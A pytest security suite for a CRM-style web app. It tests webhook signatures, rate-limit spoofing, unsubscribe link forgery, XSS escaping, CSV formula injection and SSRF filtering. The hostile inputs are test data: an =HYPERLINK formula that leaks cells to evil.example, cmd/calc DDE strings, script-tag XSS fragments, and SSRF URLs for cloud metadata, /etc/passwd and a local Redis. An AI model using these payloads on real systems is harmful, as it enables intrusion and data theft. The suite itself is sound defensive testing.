"""QA (security): webhook secrets and signatures, rate limits with X-Forwarded-For spoofing, signed unsubscribe links,
XSS from imported fields on the public pages, CSV formula injection in every export, and SSRF address tricks.

Fixtures (fictional): tests/qa/fixtures/security-auth-dpdp/hostile_values.csv holds formula, XSS and full-width payloads
in a team-sheet layout. No real network: sockets and DNS are replaced by fakes.
"""
import csv
import hashlib
import hmac
import io
import json
import socket
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import unsubscribe, web_security
from app.channels import netguard
from app.channels.webhooks import verify
from app.main import create_app
from app.unsubscribe import signature, unsub_path

FIX = Path(__file__).parent / "fixtures" / "security-auth-dpdp"
ADMIN = "qa-admin-password-01"
PUBLIC_IP = "93.184.216.34"
DANGEROUS_START = ("=", "+", "-", "@", "\t", "\r")


def make(tmp_path, password=ADMIN, peer=("198.51.100.20", 41000), **kw):
    app = create_app(data_file=tmp_path / "store.json", admin_password=password, resolver=lambda h: [PUBLIC_IP], **kw)
    return TestClient(app, client=peer)


def peer(c, ip, port=1):
    return TestClient(c.app, client=(ip, port))


def bearer(token):
    return {"Authorization": f"Bearer {token}"}


def login(c, password=ADMIN):
    r = c.post("/api/login", json={"password": password})
    assert r.status_code == 200, r.text
    return r.json()["token"]


class Recorder:
    def __init__(self):
        self.items = []

    def __call__(self, store, item):
        self.items.append(item)
        return {"matched": False}


# ---------- webhook secrets ----------
def twilio_hook(tmp_path):
    inbound = Recorder()
    c = make(tmp_path, inbound_processor=inbound)
    owner = bearer(login(c))
    assert c.put("/api/channels/sms/twilio_sms", json={"values": {"account_sid": "ACqa", "auth_token": "t", "from_number": "+14155550100"}},
                 headers=owner).status_code == 200
    url = c.get("/api/channels/webhooks?channel=sms&provider=twilio_sms", headers=owner).json()["webhooks"][0]["url"].split("8000", 1)[1]
    path, token = url.split("?token=")
    return c, path, token, inbound


FORM = {"From": "+919000010001", "To": "+14155550100", "Body": "Haan, details bhejo", "MessageSid": "SMqa1"}


def test_webhook_token_near_misses_are_all_refused(tmp_path):
    c, path, token, inbound = twilio_hook(tmp_path)
    near = [token[:-1], token + "x", token.upper() if token.upper() != token else token.lower(), " " + token,
            token[: len(token) // 2], "", "%00", token[::-1]]
    for bad in near:
        assert c.post(f"{path}?token={bad}", data=FORM).status_code == 401, bad
        assert c.post(path, data=FORM, headers={"X-Webhook-Secret": bad}).status_code == 401, bad
    assert c.post(path, data=FORM, headers={"X-Webhook-Secret": ("तोकन" + token).encode("utf-8")}).status_code == 401
    for variant in (path + "/", path.upper(), path.replace("twilio_sms", "twilio_sms2"), path.replace("/sms/", "/whatsapp/")):
        assert c.post(f"{variant}?token={token}", data=FORM).status_code in (401, 404), variant
    assert inbound.items == []
    assert c.post(f"{path}?token={token}", data=FORM).status_code == 200 and len(inbound.items) == 1


def test_webhook_gate_refuses_oversized_or_lying_content_length(tmp_path):
    c, path, token, inbound = twilio_hook(tmp_path)
    for length in ("6000000", "abc", "1e9"):
        r = c.post(f"{path}?token={token}", content=b"From=%2B919000010001&Body=hi", headers={
            "Content-Length": length, "Content-Type": "application/x-www-form-urlencoded"})
        assert r.status_code in (400, 401, 413), length
    assert inbound.items == []
    # a body really over 5 MB is refused even when the declared length lies
    big = b"Body=" + b"a" * 5_000_100
    r = c.post(f"{path}?token={token}", content=big, headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert r.status_code in (401, 413) and inbound.items == []


def test_webhook_and_activation_secrets_are_compared_in_constant_time(tmp_path, monkeypatch):
    import app.channels.security as sec
    import app.main as main
    calls = []
    real = hmac.compare_digest

    def spy(a, b):
        calls.append((type(a), type(b)))
        return real(a, b)
    monkeypatch.setattr(sec.hmac, "compare_digest", spy)
    c, path, token, _ = twilio_hook(tmp_path)
    c.post(f"{path}?token=wrong-token", data=FORM)
    assert calls                                                       # the webhook token goes through compare_digest
    calls.clear()
    owner = bearer(login(peer(c, "198.51.100.21")))
    c.put("/api/settings", json={"webhook_secret": "act-secret-QA-1234"}, headers=owner)
    monkeypatch.setattr(main.hmac, "compare_digest", spy)
    assert c.post("/api/activation/event", json={"email": "x@qa.example", "event": "role_drafted"},
                  headers={"X-Webhook-Secret": "act-secret-QA-1235"}).status_code == 401
    assert calls


def test_activation_event_secret_bypass_attempts(tmp_path):
    c = make(tmp_path)
    owner = bearer(login(c))
    c.post("/api/leads/import", json={"csv": "company,email\nQA Foods Pvt. Ltd.,hr@qa-foods.example\n"}, headers=owner)
    c.put("/api/settings", json={"webhook_secret": "act-secret-QA-1234"}, headers=owner)
    body = {"email": "HR@QA-Foods.example", "event": "role_drafted"}
    for bad in ("", "act-secret-QA-123", "act-secret-QA-12345", "ACT-SECRET-QA-1234", " act-secret-QA-1234",
                "act-secret-QA-1234\x00"):
        assert c.post("/api/activation/event", json=body, headers={"X-Webhook-Secret": bad}).status_code == 401, repr(bad)
    assert c.post("/api/activation/event", json=body, headers={"X-Webhook-Secret": "aćt-secret-QA-1234".encode()}).status_code == 401
    assert c.post("/api/activation/event?x-webhook-secret=act-secret-QA-1234", json=body).status_code == 401
    ok = c.post("/api/activation/event", json=body, headers={"X-Webhook-Secret": "act-secret-QA-1234"})
    assert ok.status_code == 200


def meta_signature(secret: str, body: bytes) -> str:
    return "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()


def test_signed_provider_signature_variants(tmp_path):
    """Meta (X-Hub-Signature-256) with an app secret: only the exact signature of the exact body counts."""
    c = make(tmp_path, inbound_processor=Recorder())
    owner = bearer(login(c))
    c.put("/api/channels/whatsapp/meta_cloud", json={"values": {"phone_number_id": "1", "access_token": "EAAqa", "app_secret": "qa-app-secret"}},
          headers=owner)
    url = c.get("/api/channels/webhooks?channel=whatsapp&provider=meta_cloud", headers=owner).json()["webhooks"][0]["url"].split("8000", 1)[1]
    path, token = url.split("?token=")
    body = json.dumps({"object": "whatsapp_business_account", "entry": []}).encode()
    good = meta_signature("qa-app-secret", body)
    js = {"Content-Type": "application/json"}
    for bad in ("", good.upper(), good[7:], "sha1=" + good[7:], meta_signature("qa-app-secret", body + b" "),
                meta_signature("", body), good + "00", "sha256=" + "0" * 64):
        assert c.post(path, content=body, headers={**js, "X-Hub-Signature-256": bad}).status_code == 401, bad
    assert c.post(f"{path}?token={token}", content=body, headers=js).status_code == 401      # the token alone is not enough
    assert c.post(path, content=body, headers={**js, "X-Hub-Signature-256": good}).status_code == 200


def test_calendly_signature_replay_window_over_days(tmp_path):
    c = make(tmp_path)
    owner = bearer(login(c))
    c.put("/api/channels/calendar/calendly", json={"values": {"access_token": "cal-pat-qa"}}, headers=owner)
    store = c.app.state.store
    url = c.get("/api/channels/webhooks?channel=calendar&provider=calendly", headers=owner).json()["webhooks"][0]["url"]
    token = url.split("?token=")[1]
    body = b'{"event":"invitee.created"}'
    stamp = 1_793_700_000
    sig = hmac.new(token.encode(), f"{stamp}.".encode() + body, hashlib.sha256).hexdigest()
    headers = {"calendly-webhook-signature": f"t={stamp},v1={sig}"}
    assert verify(store, "calendar", "calendly", "POST", headers, {}, body, now=stamp + 60)
    for later in (301, 3600, 86400, 3 * 86400):
        assert not verify(store, "calendar", "calendly", "POST", headers, {}, body, now=stamp + later), later
    assert not verify(store, "calendar", "calendly", "POST", headers, {}, body, now=stamp - 3600)      # from the future


# ---------- rate limits and X-Forwarded-For ----------
@pytest.mark.parametrize("path,method,limit", [
    ("/api/login", "post", 5), ("/u/qa.nosig", "get", 30), ("/demo/qa-nope", "get", 60),
    ("/api/webhooks/sms/twilio_sms", "post", 120)])
def test_rotating_x_forwarded_for_from_a_remote_caller_does_not_reset_the_limit(tmp_path, path, method, limit):
    c = make(tmp_path)
    attacker = peer(c, "203.0.113.66")
    codes = [getattr(attacker, method)(path, headers={"X-Forwarded-For": f"10.0.{i // 250}.{i % 250}",
                                                      "X-Real-IP": f"192.0.2.{i % 250}"}).status_code for i in range(limit + 3)]
    assert 429 not in codes[:limit] and codes[limit:] == [429, 429, 429]
    assert getattr(peer(c, "203.0.113.67"), method)(path).status_code != 429


def test_behind_the_local_proxy_each_real_client_has_its_own_bucket_and_cannot_pick_it(tmp_path):
    c = make(tmp_path)
    proxy = peer(c, "127.0.0.1")
    # a client that sends its own X-Forwarded-For: Caddy appends the real address last, which is what counts
    codes = [proxy.get("/u/qa.nosig", headers={"X-Forwarded-For": f"8.8.{i}.8, 198.51.100.99"}).status_code for i in range(31)]
    assert codes[-1] == 429 and 429 not in codes[:30]
    assert proxy.get("/u/qa.nosig", headers={"X-Forwarded-For": "198.51.100.100"}).status_code != 429
    # garbage in the last hop falls back to the proxy address, it does not create a fresh bucket per request
    garbage = [proxy.get("/demo/qa-nope", headers={"X-Forwarded-For": f"not-an-ip-{i}"}).status_code for i in range(61)]
    assert garbage[-1] == 429


def test_login_brute_force_via_path_variants_is_not_a_bypass(tmp_path):
    c = make(tmp_path)
    attacker = peer(c, "203.0.113.70")
    for variant in ("/api/login/", "/API/login", "/api//login"):
        r = attacker.post(variant, json={"password": ADMIN}, follow_redirects=False)
        assert r.status_code in (307, 401, 404, 405) and "token" not in r.text, variant
    # a query string is the same route and the same bucket
    for _ in range(5):
        attacker.post("/api/login", json={"password": "wrong-password-x"})
    assert attacker.post("/api/login?x=1", json={"password": ADMIN}).status_code == 429
    # five wrong passwords lock the address for a minute even when the right one follows
    lock = peer(c, "203.0.113.71")
    for _ in range(5):
        lock.post("/api/login", json={"password": "wrong-password-x"})
    assert peer(c, "203.0.113.71").post("/api/login", json={"password": ADMIN}).status_code == 429


# ---------- signed unsubscribe links ----------
def test_unsubscribe_link_forgery_attempts(tmp_path):
    c = make(tmp_path)
    owner = bearer(login(c))
    c.post("/api/leads/import", json={"csv": "company,contact_name,email\nQA Foods,Neha,neha@qa-foods.example\n"
                                              "QA Mart,Ravi,ravi@qa-mart.example\n"}, headers=owner)
    leads = {l["company"]: l["id"] for l in c.get("/api/leads", headers=owner).json()}
    store = c.app.state.store
    victim, mine = leads["QA Foods"], leads["QA Mart"]
    my_sig = unsub_path(store, mine).split(".", 1)[1]
    good_sig = signature(store.read("settings")["server_secret"], victim)
    forged = [f"{victim}.{my_sig}", f"{victim}.{good_sig[:-1]}", f"{victim}.{good_sig.upper()}", f"{victim}.{good_sig}x",
              f"{victim}.{good_sig}.x", f"{victim}.", f"{victim}..{good_sig}", f"{victim}.{signature('', victim)}",
              f"{victim}.{signature('wrong-secret', victim)}", f"{victim.upper()}.{good_sig}", victim]
    public = peer(c, "203.0.113.80")
    for token in forged:
        assert public.get(f"/u/{token}").status_code == 404, token
        assert public.post(f"/u/{token}").status_code == 404, token
    assert next(l for l in c.get("/api/leads", headers=owner).json() if l["id"] == victim)["stage"] != "unsubscribed"
    assert public.post(f"/u/{victim}.{good_sig}").status_code == 200
    assert next(l for l in c.get("/api/leads", headers=owner).json() if l["id"] == victim)["stage"] == "unsubscribed"


def test_legacy_unsigned_link_window_with_time_travel(tmp_path):
    c = make(tmp_path)
    store = c.app.state.store
    owner = bearer(login(c))
    c.post("/api/leads/import", json={"csv": "company,email\nQA Foods,neha@qa-foods.example\nQA Mart,ravi@qa-mart.example\n"},
           headers=owner)
    ids = [l["id"] for l in c.get("/api/leads", headers=owner).json()]
    cutover = datetime(2026, 9, 1, tzinfo=timezone.utc)
    store.update("settings", lambda s: {**s, unsubscribe.CUTOVER_KEY: cutover.isoformat()})
    store.write("outbox", [{"lead_id": ids[0], "status": "sent", "sent_at": "2026-08-25T05:00:00+00:00"},
                           {"lead_id": ids[1], "status": "dry_run", "sent_at": "2026-08-25T05:00:00+00:00"},
                           {"lead_id": ids[1], "status": "sent", "sent_at": "2026-09-02T05:00:00+00:00"}])
    for days, expected in ((1, True), (30, True), (59, True), (61, False), (400, False)):
        now = datetime(2026, 8, 25, 5, tzinfo=timezone.utc) + timedelta(days=days)
        assert unsubscribe.legacy_allowed(store, ids[0], now) is expected, days
    # a practice email or an email sent after signing started never opens the unsigned form
    assert unsubscribe.legacy_allowed(store, ids[1], datetime(2026, 9, 5, tzinfo=timezone.utc)) is False
    assert unsubscribe.legacy_allowed(store, "no-such-lead", datetime(2026, 9, 5, tzinfo=timezone.utc)) is False


# ---------- XSS from imported fields ----------
def import_hostile(c, owner):
    text = (FIX / "hostile_values.csv").read_text(encoding="utf-8")
    r = c.post("/api/leads/import", json={"csv": text, "source": "qa-hostile"}, headers=owner)
    assert r.status_code == 200, r.text
    return [l for l in c.get("/api/leads", headers=owner).json() if l.get("source") == "qa-hostile" or "hostile" in (l.get("website") or "")]


RAW_XSS = ("<script>alert", "<img src=x", "<svg onload", "</title><svg", "' onmouseover='", "\"><img")


def test_xss_payloads_from_an_import_are_escaped_on_demo_and_unsubscribe_pages(tmp_path):
    c = make(tmp_path)
    owner = bearer(login(c))
    leads = import_hostile(c, owner)
    assert len(leads) >= 15
    for i, lead in enumerate(leads):
        public = peer(c, f"192.0.2.{i + 1}")                              # stay under the per-address page limits
        link = c.post(f"/api/leads/{lead['id']}/demo-link", headers=owner).json()
        page = public.get(f"/demo/{link['token']}")
        assert page.status_code == 200
        body = page.text.split("<script nonce=")[0]                      # the app's own beacon script is the only script
        assert not [p for p in RAW_XSS if p in body], lead["company"]
        assert "href=\"javascript" not in body.lower() and "href='javascript" not in body.lower()
        assert page.text.count("<script") == 1 and "nonce-" in page.headers["content-security-policy"]
        unsub = public.get(unsub_path(c.app.state.store, lead["id"]))
        assert unsub.status_code == 200 and "<script" not in unsub.text and "script-src 'none'" in unsub.headers["content-security-policy"]


def test_unsubscribe_and_demo_paths_with_markup_in_the_token_are_inert(tmp_path):
    c = make(tmp_path)
    public = peer(c, "203.0.113.91")
    for token in ("<script>alert(1)</script>", "x'><svg onload=alert(1)>", "%3Cscript%3E"):
        for url in (f"/u/{token}", f"/demo/{token}"):
            r = public.get(url)
            assert r.status_code == 404 and "<script>" not in r.text and "<svg" not in r.text


# ---------- CSV formula injection ----------
def read_cells(response):
    text = response.content.decode("utf-8-sig")
    return [cell for row in csv.reader(io.StringIO(text)) for cell in row]


def test_no_export_cell_can_start_a_formula_in_any_dataset(tmp_path):
    c = make(tmp_path)
    owner = bearer(login(c))
    leads = import_hostile(c, owner)
    lead_id = leads[0]["id"]
    payload = '=HYPERLINK("https://evil.example/?d="&A1,"Click")'
    c.post("/api/tasks", json={"title": payload, "lead_id": lead_id}, headers=owner)
    c.post(f"/api/leads/{lead_id}/activity", json={"type": "call", "outcome": "connected", "notes": "@SUM(1+9)*cmd|' /C calc'!A0"},
           headers=owner)
    c.post(f"/api/leads/{lead_id}/note", json={"text": "+cmd|' /C calc'!A0"}, headers=owner)
    datasets = [d["dataset"] for d in c.get("/api/export", headers=owner).json()]
    hostile_seen = 0
    for dataset in datasets:
        params = {"lead_id": lead_id} if dataset == "activity" else {}
        r = c.get(f"/api/export/{dataset}.csv", params=params, headers=owner)
        if r.status_code == 400:
            continue
        assert r.status_code == 200, (dataset, r.text)
        cells = read_cells(r)
        assert not [x for x in cells if x[:1] in DANGEROUS_START], dataset
        hostile_seen += sum(1 for x in cells if x[:2] in ("'=", "'+", "'-", "'@", "'\t"))
    apollo = c.get("/api/enrich/apollo-export", headers=owner)
    if apollo.status_code == 200 and apollo.content:
        assert not [x for x in read_cells(apollo) if x[:1] in DANGEROUS_START]
    assert hostile_seen >= 20                                             # the payloads really reached the files


# ---------- SSRF ----------
def inet_aton_resolver(host):
    """What the C library does with odd numeric spellings, offline: 2130706433, 0x7f.1, 0177.0.0.1 all mean 127.0.0.1."""
    return [socket.inet_ntoa(socket.inet_aton(host))]


@pytest.mark.parametrize("url", [
    "http://127.0.0.1/", "http://127.1/", "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://0/",
    "http://169.254.169.254/latest/meta-data/", "http://[::ffff:169.254.169.254]/", "http://[::ffff:7f00:1]/", "http://[::1]/",
    "http://[fe80::1%25eth0]/", "http://[64:ff9b::a9fe:a9fe]/", "http://[2002:7f00:1::]/", "http://LOCALHOST./",
    "http://metadata.google.internal/", "http://printer.local/", "http://10.0.0.5:8080/", "http://[fd00::1]/"])
def test_private_metadata_and_odd_ip_spellings_are_refused_before_connecting(url, monkeypatch):
    connections = []
    monkeypatch.setattr(netguard.socket, "create_connection", lambda *a, **k: connections.append(a) or (_ for _ in ()).throw(OSError()))
    with pytest.raises((ValueError, OSError)):
        netguard.guarded_request(url, resolver=inet_aton_resolver, allow_http=True)
    assert connections == []


def test_dns_rebinding_and_mixed_answers_are_refused(monkeypatch):
    connections = []
    monkeypatch.setattr(netguard.socket, "create_connection", lambda *a, **k: connections.append(a) or (_ for _ in ()).throw(OSError()))
    for answers in (["93.184.216.34", "127.0.0.1"], ["::ffff:10.0.0.1"], ["169.254.169.254"], []):
        with pytest.raises((ValueError, OSError)):
            netguard.resolve_public("careers.qa-foods.example", 443, resolver=lambda h, a=answers: a)
    assert connections == []


def test_scrape_api_refuses_private_targets_with_generic_errors(tmp_path, monkeypatch):
    monkeypatch.setattr(netguard, "_resolve", lambda host: ["169.254.169.254"])
    monkeypatch.setattr(netguard.socket, "create_connection", lambda *a, **k: (_ for _ in ()).throw(AssertionError("connected")))
    c = make(tmp_path)
    owner = bearer(login(c))
    for url in ("http://jobs.qa-foods.example/", "http://169.254.169.254/latest/meta-data/iam/", "http://[::ffff:a9fe:a9fe]/",
                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "http://user:pw@qa-foods.example/"):
        r = c.post("/api/scrape/extract", json={"url": url}, headers=owner)
        assert r.status_code == 400, url
        assert "169.254" not in r.json()["detail"] or "not" in r.json()["detail"].lower()
        assert "Errno" not in r.json()["detail"] and "Traceback" not in r.text


# ---------- regression: full-width characters crashed the importers ----------
@pytest.mark.parametrize("value", ["＠SUM(A1)", "https://a＠b.example", "hr＠qa-foods.example", "qa-foods.example／careers",
                                   "http://qa-foods.example？q=1"])
def test_full_width_url_characters_do_not_break_an_import(tmp_path, value):
    """Before the fix: urlparse raised ValueError (NFKC check) in the column sniffer and in company_domain, so one such
    cell refused the whole quick import with a cryptic 400 or crashed it with a 500."""
    from app.hygiene import company_domain
    from app.standardise import host_of
    assert host_of(value) == "" or "." in host_of(value)
    company_domain(value)                                                  # no exception
    c = TestClient(create_app(data_file=tmp_path / "store.json", admin_password=""), client=("127.0.0.1", 1),
                   raise_server_exceptions=False)
    rows = "".join(f"QA Co {i},{value},{value},Pune\n" for i in range(8))
    text = f"Company,Website,Email,City\n{rows}Saffron Foods Ltd.,https://saffron-foods.example,hr@saffron-foods.example,Pune\n"
    for url, body in (("/api/leads/import", {"csv": text}), ("/api/import/commit", {"csv": text}),
                      ("/api/leads/import-sheet", {"csv": text, "tab": "leads"})):
        r = c.post(url, json=body)
        assert r.status_code == 200, (url, r.text)
    assert any(l["company"] == "Saffron Foods Ltd." for l in c.get("/api/leads").json())
